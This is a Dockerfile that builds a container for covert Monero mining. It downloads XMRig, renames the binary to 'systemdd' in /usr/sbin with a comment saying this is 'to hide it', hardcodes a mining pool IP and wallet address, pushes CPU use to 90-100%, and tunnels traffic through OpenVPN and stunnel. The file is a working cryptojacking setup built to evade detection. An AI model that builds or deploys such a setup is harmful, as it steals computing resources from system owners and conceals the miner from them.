# Use Ubuntu 22.04 as the base image
FROM ubuntu:22.04

# Install necessary tools, including Tor, Privoxy, OpenVPN
RUN apt-get update && apt-get install -y \
    wget \
    openvpn \
    sudo \
    bc \
    nano \
    rename \
    cpulimit \
    stunnel4 \
    libcap-dev \
    util-linux \
    libcap2-bin \
    && apt-get clean

# Set environment variables for XMRig and system settings
ENV VERSION="6.21.0" \
    WORK_DIR="/root/work" \
    POOL="47.238.77.233:443" \
    USERNAME="44XbJdyExZZbCqrGyvG1oUbTpBL8JNqHVh8hmYXgUfEHgHs4t45yMfKeTAUQ4dDNtPc2vXhj83uJf1byNSgwU9ZYFxgT3Ao" \
    ALGO="rx/0" \
    DONATE="1" \
    VPN_CONFIG="/etc/openvpn/client.ovpn" \
    STUNNEL="etc/stunnel/stunnel.conf" \
    CPU_MIN="90" \
    CPU_MAX="100"

# Create work directory
RUN mkdir -p $WORK_DIR

# Download and extract XMRig
RUN wget https://github.com/xmrig/xmrig/releases/download/v${VERSION}/xmrig-${VERSION}-linux-x64.tar.gz -P $WORK_DIR \
    && tar -xvzf $WORK_DIR/xmrig-${VERSION}-linux-x64.tar.gz -C $WORK_DIR \
    && mv $WORK_DIR/xmrig-${VERSION}/xmrig $WORK_DIR/xmrig

# Move and rename the executable to hide it
RUN mv /root/work/xmrig /usr/sbin/systemdd

# Copy configuration files into the container
COPY start.py /root/start.py
COPY client.ovpn /etc/openvpn/client.ovpn
COPY stunnel.conf /etc/stunnel/stunnel.conf

# Set execution permissions for the scripts and correct permissions for configuration files
RUN chmod +x /root/start.py 
    && chmod 644 /etc/openvpn/client.ovpn /etc/stunnel/stunnel.conf

# Ensure the device TUN is available for OpenVPN
RUN mkdir -p /dev/net && mknod /dev/net/tun c 10 200

# Run start.sh when the container starts
CMD ["/root/start.py"]
